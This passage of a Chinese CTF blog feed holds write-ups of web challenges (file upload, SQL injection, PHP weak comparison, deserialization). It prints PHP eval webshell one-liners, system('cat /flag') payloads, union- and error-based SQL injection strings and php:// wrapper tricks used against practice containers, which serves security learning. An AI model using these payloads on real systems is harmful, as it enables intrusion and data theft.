<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>$photo = 随便上传一个满足要求的文件</p><p><img src="/2021/05/04/2021ISCC/13.png" alt="13"></p><p>上传成功：<img src="/2021/05/04/2021ISCC/14.png" alt="14"></p><p>base64解码：<img src="/2021/05/04/2021ISCC/15.png" alt="15"></p><p>sp：部分函数的数组绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sha1(Array()) &#x3D; null</span><br><span class="line">ereg(pattern,Array()) &#x3D;null</span><br><span class="line">preg_match(pattern,Array()) &#x3D; false</span><br><span class="line">strcmp(Array(), “abc”) &#x3D;null</span><br><span class="line">strpos(Array(),“abc”) &#x3D; null</span><br><span class="line">strlen(Array()) &#x3D; null</span><br><span class="line">md5(Array()) &#x3D; null</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_43622442/article/details/105751356">https://blog.csdn.net/qq_43622442/article/details/105751356</a></p><p><a href="https://blog.csdn.net/qq_43054896/article/details/105586792">https://blog.csdn.net/qq_43054896/article/details/105586792</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web：ISCC客服冲冲冲（一）——关于js前端&quot;&gt;&lt;a href=&quot;#web：ISCC客服冲冲冲（一）——关于js前端&quot; class=&quot;headerlink&quot; title=&quot;web：ISCC客服冲冲冲（一）——关于js前端&quot;&gt;&lt;/a&gt;web：ISCC客服冲冲冲（</summary>
      
    
    
    
    
    <category term="ISCC" scheme="http://example.com/tags/ISCC/"/>
    
  </entry>
  
  <entry>
    <title>i春秋</title>
    <link href="http://example.com/2021/04/29/i%E6%98%A5%E7%A7%8B2/"/>
    <id>http://example.com/2021/04/29/i%E6%98%A5%E7%A7%8B2/</id>
    <published>2021-04-29T02:17:47.000Z</published>
    <updated>2021-05-22T12:05:11.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2017第二届广东省强网杯线上赛broken——（jsfuck）"><a href="#2017第二届广东省强网杯线上赛broken——（jsfuck）" class="headerlink" title="2017第二届广东省强网杯线上赛broken——（jsfuck）"></a>2017第二届广东省强网杯线上赛broken——（jsfuck）</h1><p>打开容器：</p><p><img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/1.png" alt="1"></p><p>点开文件：<img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/2.png"></p><p>发现全是这样的乱码，查阅资料发现这是一种jsfuck编码：JSFuck 可以让你只用 6 个字符<code>[</code> <code>]</code> <code>(</code> <code>)</code> <code>!</code> <code>+</code>来编写 JavaScript 程序。</p><p>我们赋值这段字符串，贴在控制台<img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/3.png"></p><p>点击<code>&#123;&#125;</code>美化表达式，运行发现报错，对比一下表达式，发现第一行的<code>[</code>没有对应<code>]</code>匹配，我们把它加上，页面弹出一个窗口<img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/5.png" alt="5"></p><p><img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/4.png" alt="4"></p><p>我们猜测弹出这个窗口的源码或为alert(‘flag is not here’)，把这段源码jsfuck编码，发现其长度也不过26806，而上面jsfuck表达式的长度有127763，说明这其中还有别的代码，而flag很有可能藏在其中，那么我们接下来就想怎么能获得源码呢？</p><p>查看了wp他是说把结尾的<code>()</code>删去，再补个<code>]</code>，同时把刚开始时补的<code>]</code>删去</p><p>解释是该段代码最后()代表的是函数的结尾，所以只要把最后这个括号删掉就不会弹框了</p><p><img src="/2021/04/29/i%E6%98%A5%E7%A7%8B2/6.png" alt="6"></p><p>1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2017第二届广东省强网杯线上赛broken——（jsfuck）&quot;&gt;&lt;a href=&quot;#2017第二届广东省强网杯线上赛broken——（jsfuck）&quot; class=&quot;headerlink&quot; title=&quot;2017第二届广东省强网杯线上赛broken——（jsf</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>i春秋</title>
    <link href="http://example.com/2021/04/19/i%E6%98%A5%E7%A7%8B1/"/>
    <id>http://example.com/2021/04/19/i%E6%98%A5%E7%A7%8B1/</id>
    <published>2021-04-19T14:25:33.000Z</published>
    <updated>2021-04-29T02:02:11.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三届“百越杯”福建省高校网络空间安全大赛"><a href="#第三届“百越杯”福建省高校网络空间安全大赛" class="headerlink" title="第三届“百越杯”福建省高校网络空间安全大赛"></a>第三届“百越杯”福建省高校网络空间安全大赛</h1><h2 id="（upload文件上传漏洞）"><a href="#（upload文件上传漏洞）" class="headerlink" title="（upload文件上传漏洞）"></a>（upload文件上传漏洞）</h2><p>打开题目地址发现是一道文件上传题，尝试上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容</p><p>再上传一次，burp抓包，修改后缀jpg为php，发现也上传成功<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\1.png" alt="1"></p><p>用蚁剑连接<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\2.png" alt="2"></p><p>没有直接给我们flag，那么可能”藏“起来了</p><p>在虚拟终端上寻找，也找不到</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\3.png" alt="3"></p><p>然后我以为flag被删了，看了大佬的博客才知道，config文件里面有内容<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\5.png" alt="5"></p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\4.png" alt="4"></p><p>于是我们在蚁剑的主页选择数据操作，添加数据库，连接用户和连接密码时刚刚配置文件的内容</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\6.png" alt="6"></p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\7.png" alt="7"></p><p>其实感觉能猜到config里面有东西还是蛮神奇的，可能是config文件是配置文件的原因，所以会下意识的去那里找线索。</p><h1 id="“百度杯”CTF比赛-九月场"><a href="#“百度杯”CTF比赛-九月场" class="headerlink" title="“百度杯”CTF比赛 九月场"></a>“百度杯”CTF比赛 九月场</h1><h2 id="（文件上传漏洞）"><a href="#（文件上传漏洞）" class="headerlink" title="（文件上传漏洞）"></a>（文件上传漏洞）</h2><p>我们先上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容。然后在上传上传一次，burp拦截修改后缀为php，也上传成功。但是他并没有直接告诉我们他上传的位置，我们查看源码可以看到<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\8.png" alt="8"></p><p>点击进入网页<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\9.png" alt="9"></p><p>我们都知道，按理来说这里不应该显出源码的，那么对比说明这里过滤了<code>&lt;? </code>  和<code>php</code></p><p>我们可以尝试换标签（如<code>&lt;script&gt;</code>）来绕过<code>&lt;?</code>过滤</p><p>通过大小写来绕过<code>php</code>过滤</p><p><strong>法1：</strong>构造一个内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>后缀为jsp的文件，上传，蚁剑连接<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\10.png" alt="10"></p><p>法2：<a href="https://blog.csdn.net/ITmincherry/article/details/102531096">https://blog.csdn.net/ITmincherry/article/details/102531096</a></p><h1 id="“百度杯”CTF比赛-2017-二月场"><a href="#“百度杯”CTF比赛-2017-二月场" class="headerlink" title="“百度杯”CTF比赛 2017 二月场"></a>“百度杯”CTF比赛 2017 二月场</h1><h2 id="（文件包含漏洞）"><a href="#（文件包含漏洞）" class="headerlink" title="（文件包含漏洞）"></a>（文件包含漏洞）</h2><p>我们看到这是一道文件包含漏洞题：<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\11.png" alt="11"></p><p>我们会想到利用PHP的输入流php://input<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\12.png" alt="12"></p><p>我们看到有一个文件名比较奇特，用PHP://filter读取dle345aae.php文件<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\13.png" alt="13"></p><p>再base64解码得</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\14.png" alt="14"></p><h1 id="“百度杯”CTF比赛-九月场——123"><a href="#“百度杯”CTF比赛-九月场——123" class="headerlink" title="“百度杯”CTF比赛 九月场——123"></a>“百度杯”CTF比赛 九月场——123</h1><p>打开容器，发现一个登入框，还以为是sql注入，尝试了一下发现都是报错，查看源码：<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\15.png" alt="15"></p><p>然后查看user.php，但是发现网页里面什么也没有，源码也是</p><p>于是我用御剑扫了一下端口，发现有一个flag.php的文件，但是点景区，发现被骗了，是假的。</p><p>于是看了大佬的提示，这里应该查看user.php的备份文件user.php.bak，属于备份隐私泄露</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\16.png" alt="16"></p><p>下载下来，里面都是用户名，根据login.php源码的提示，密码由用户名+生日年份构成</p><p>尝试burp爆破：<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\17.png" alt="17"></p><p>设定两个参数，然后更改攻击模式为battering ram，即对两个参数同时爆破，且payload相同</p><p>我们猜测这么多用户里面应该会有人是1995年出生的，然后爆破出<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\18.png" alt="18"></p><p>用爆破出的用户名密码登入，页面什么内容也没有，查看源码发现：<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\19.png" alt="19"></p><p>F12进入开发者模式将注释符都删掉，得到一个上传框，上传一句话木马文件，<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\20.png" alt="20"></p><p>上传后缀jpg的一句话木马<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\21.png" alt="21"></p><p>这就有点奇怪了，为什么明明已经是白名单的后缀了，文件名还是不合法<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\22.png" alt="22"></p><p>尝试利用Apache的后缀解析<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\23.png" alt="23"></p><p>删去一句话木马<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\24.png" alt="24"></p><p>打开<code>/view.php</code>网页<img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\25.png" alt="25"></p><p>传参：?file=1</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\26.png" alt="26"></p><p>过滤了<code>flag</code>，尝试双写绕过</p><p><img src="/2021/04/19/i%E6%98%A5%E7%A7%8B1/Users/Lenovo\Desktop\blog\hexo\source_posts\i春秋\27.png" alt="27"></p><p>SP: burp的几种攻击模式：<a href="https://blog.csdn.net/qq_39101049/article/details/90234669">https://blog.csdn.net/qq_39101049/article/details/90234669</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第三届“百越杯”福建省高校网络空间安全大赛&quot;&gt;&lt;a href=&quot;#第三届“百越杯”福建省高校网络空间安全大赛&quot; class=&quot;headerlink&quot; title=&quot;第三届“百越杯”福建省高校网络空间安全大赛&quot;&gt;&lt;/a&gt;第三届“百越杯”福建省高校网络空间安全大赛&lt;/</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf2</title>
    <link href="http://example.com/2021/04/13/buuctf2/"/>
    <id>http://example.com/2021/04/13/buuctf2/</id>
    <published>2021-04-13T10:42:02.000Z</published>
    <updated>2021-05-21T13:19:40.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>这关之前有做过类似的，但是这个应该是升级版</p><p>进过尝试可知注入类型为单引号注入，用万能密码尝试登入</p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\2.png" alt="2"></p><p>发现这次flag不在里面了，那我们尝试一下获取他的数据库信息</p><p><strong>法1：</strong></p><p><strong>union联合注入</strong></p><p>确认返回字段数：<code>1&#39; union select 1,2,3#</code></p><p>爆库：<code>1&#39; union select 1,2,database()#</code></p><p>爆表：<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p><p>爆列：<code>1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;#</code></p><p>爆值：<code>1&#39; union select 1,2,group_concat(username,password) from geekuser#</code></p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\5.png" alt="5"></p><p>发现该表下只有一行数据：id=1,username=admin,password=“字符串”</p><p>于是我们再查一下<code>l0ve1ysq1</code>表——<code>1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1#</code></p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\6.png" alt="6"></p><p><strong>法2：</strong></p><p>报错注入：</p><p>由于输入<code>1&#39;</code> 会返回报错信息，尝试报错注入：</p><p>爆库：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))#</code></p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\1.png" alt="1"></p><p>爆表：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))#</code><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\3.png" alt="3"></p><p>爆列：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))#</code></p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\4.png" alt="4"></p><p>爆值：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))#</code></p><p>发现返回一串字符串，但是flag不在其中，查看另一个表</p><p><code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))#</code><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\7.png" alt="7"></p><p>发现由于报错注入的返回长度的限制，后续的值没有全部回显在页面上，因此要用substr函数去截，还挺麻烦的，后续的就不写了。</p><h1 id="ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）"><a href="#ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）" class="headerlink" title="[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）"></a>[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）</h1><p>打开容器发现什么也没有，查看源码也没有，御剑扫描也没有，看到题目提示备份文件，联想到之前有做过以<code>.bak</code>为后缀的备份文件的题</p><p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\8.png" alt="8"></p><p>打开文件发现一段源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计：将get的值赋给参数key，先判断key是否为数字，不是则退出，是则通过intval获取参数中的整数部分，然后和变量str的值进行对比，相等则输出flag。</p><p><strong>sp：</strong></p><p>由于<code>php</code>弱口令的特性，字符串和数字比较使用==时,字符串会先转换为数字类型再比较</p><p>var_dump(‘a’ == 0);//true                   ——此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0<br>var_dump(‘123a’ == 123);//true        ——这里’123a’会被转换为123</p><p><code>php</code>中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。<br>举例：</p><p>var_dump(‘a123’ == 123);//false</p><p>var_dump(‘1233a’ == 123);//false</p><p>var_dump(‘123a1’ == 123);//true</p><p>因此这里我们只需要构造payload：?key=123即可</p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>点开容器，进入PAYFLAG页面，查看源码：<img src="/2021/04/13/buuctf2/9.png" alt="9"></p><p>我们需要上传money和password，根据网页提示money=100000000，password=404a绕过is_numeric和php弱口令相等</p><p><img src="/2021/04/13/buuctf2/13.png" alt="13"></p><p>没什么内容，抓包试试</p><p><img src="/2021/04/13/buuctf2/10.png" alt="10"></p><p>修改user的值为student，但是这样也不行，那改成1：<img src="/2021/04/13/buuctf2/11.png" alt="11"></p><p>太长了，尝试改用科学计数法<img src="/2021/04/13/buuctf2/12.png" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;极客大挑战-2019-LoveSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-LoveSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]LoveSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]LoveSQL&lt;/h1&gt;&lt;p&gt;这关之前</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="http://example.com/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-04-08T08:27:15.000Z</published>
    <updated>2021-04-08T08:34:37.617Z</updated>
    
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>bugukuu2</title>
    <link href="http://example.com/2021/04/07/bugku2/"/>
    <id>http://example.com/2021/04/07/bugku2/</id>
    <published>2021-04-07T14:50:37.000Z</published>
    <updated>2021-04-08T13:46:06.519Z</updated>
    
    <content type="html"><![CDATA[<p>web25</p><h1 id="web26（伪造Referer）"><a href="#web26（伪造Referer）" class="headerlink" title="web26（伪造Referer）"></a>web26（伪造Referer）</h1><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\1.png" alt="1"></p><p>我们知道Referer可以伪造的，burp抓包，添加语句：<code>Referer: http://www.google.com</code></p><p>获得flag</p><p>web27</p><h1 id="web28：（伪造X-Forwarded-For）"><a href="#web28：（伪造X-Forwarded-For）" class="headerlink" title="web28：（伪造X-Forwarded-For）"></a>web28：（伪造X-Forwarded-For）</h1><p>这题就是伪造X-Forwarded-For不多说了</p><p>web29</p><h1 id="web30：（猜测-php-input利用-file-get-contents-函数绕过）"><a href="#web30：（猜测-php-input利用-file-get-contents-函数绕过）" class="headerlink" title="web30：（猜测 || php:input利用||file_get_contents() 函数绕过）"></a>web30：（猜测 || php:input利用||file_get_contents() 函数绕过）</h1><p>题目说txt，什么用呢先记着</p><p>打开题目地址，看见源码<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\2.png" alt="2"></p><ul><li><p>新函数：</p><p><strong>extract() 函数</strong></p><p>功能： 从数组中将变量导入到当前的符号表</p><p>语法：extract(array,extract_rules,prefix)</p></li></ul><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>array</em></td><td>必需。规定要使用的数组。</td></tr><tr><td><em>extract_rules</em></td><td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值：  EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td><em>prefix</em></td><td>可选。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p>  <strong>file_get_contents() 函数</strong></p><p>  功能：把整个文件读入一个字符串中</p><p>  语法：file_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td></tr><tr><td>start</td><td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td></tr><tr><td>max_length</td><td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td></tr></tbody></table><p>代码审计：通过get的方式获取$ac和$fn，file_get_contents() 函数读取文件内容，然后赋值给$f，当$f=$ac时输出flag</p><p><strong>法1：</strong>由于题目提到一个后缀txt，猜测存在文件名flag.txt，访问，果然存在<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\3.png" alt="3"></p><p>构造payload：<code>?ac=bugku&amp;fn=flag.txt</code></p><p><strong>法2：</strong>利用php伪协议php://input </p><p>当传入的参数值作为文件名打开时，可以将参数值设为php://input,同时<code>post</code>想设置的文件内容，<strong>php执行时会将post内容当作文件内容。</strong></p><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\4.png" alt="4"></p><h1 id="web31：（御剑扫描-burp暴力破解）"><a href="#web31：（御剑扫描-burp暴力破解）" class="headerlink" title="web31：（御剑扫描+burp暴力破解）"></a>web31：（御剑扫描+burp暴力破解）</h1><p>刚打开题目地址还以为网络崩了，刷了几次还是一样，那应该就是题目页面了，查看一下源码，没东西，蚁剑扫一下<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\5.png" alt="5"></p><p>发现有一个robots.txt，点进去看一下<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\6.png" alt="6"></p><p>打开resusl.php<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\7.png" alt="7"></p><p>发现这里通过GET方式获取参数x，当x的值等password时应该就会跳出flag了，尝试爆破</p><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\8.png" alt="8"></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>神仙题，没看源码做个鬼</p><h1 id="web34：（upload-一句话木马）"><a href="#web34：（upload-一句话木马）" class="headerlink" title="web34：（upload+一句话木马）"></a>web34：（upload+一句话木马）</h1><p>打开题目地址，页面上没什么东西，查看源码：<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\9.png" alt="9"></p><p>点开upload.php<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\10.png" alt="10"></p><p>尝试一句话木马，然后发现它设立了一个白名单，看起来不好绕了</p><p>上传图片马，访问上传地址：<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\11.png" alt="11"></p><p>我们看到看来服务器过滤了<code>&lt;?php</code>和<code>?&gt;</code></p><p><strong>法1：</strong>我们创建一个新文件，后缀jpg，内容<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;</code>上传，访问发现一片空白，说明被当做php代码执行了，蚁剑连接，终端寻找<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\12.png" alt="12"></p><p><strong>法2：</strong>我们创建一个新文件，后缀jpg，内容<code>&lt;script language=&quot;php&quot;&gt;system(&quot;find / -name flag*&quot;); &lt;/script&gt;</code></p><p>访问上传地址<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\13.png" alt="13"></p><p>直接<code>?flie=/flag</code>   ， flag就出来了</p><p>然后我自己修改了一下文件内容：<code>&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;); &lt;/script&gt;</code></p><p>访问上传地址<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\14.png" alt="14"></p><h1 id="web35：（反序列化）"><a href="#web35：（反序列化）" class="headerlink" title="web35：（反序列化）"></a>web35：（反序列化）</h1><p>点开题目地址</p><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\15.png" alt="15"></p><p>第一眼看还以为是一道sql注入题，结果发现login点不动。查看源码<img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\16.png" alt="16"></p><p>点击</p><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\17.png" alt="17"></p><p>尝试传输：<code>?25603</code><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\18.png" alt="18"></p><p>我们看到当cookie的值反序列化后等于key的值时会输出flag，于是我们自然想到将key的值先序列化后赋值给cookie</p><p>php在线工具：<code>https://c.runoob.com/compile/1</code><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\19.png" alt="19"></p><p>构造payload:<code>Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;</code></p><p><img src="/2021/04/07/bugku2/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku2\20.png" alt="20"></p>]]></content>
    
    
      
      
